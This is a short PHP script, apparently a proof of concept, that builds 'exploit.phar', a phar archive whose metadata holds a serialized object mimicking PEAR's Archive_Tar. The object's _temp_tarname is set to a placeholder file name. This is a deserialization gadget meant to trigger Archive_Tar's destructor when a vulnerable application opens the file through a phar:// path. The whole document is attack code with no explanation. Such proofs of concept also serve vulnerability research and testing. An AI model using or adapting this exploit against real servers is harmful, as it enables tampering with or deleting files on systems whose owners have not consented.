<?php

class Archive_Tar {
  public $_temp_tarname;
  function __construct($_temp_tarname) {
    $this->_temp_tarname = $_temp_tarname;
  }
}

$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('whatever', 'whatever');
$phar->setStub('<?php __HALT_COMPILER(); ? >');
$phar->setMetadata(new Archive_Tar('unserialize_test'));
$phar->stopBuffering();
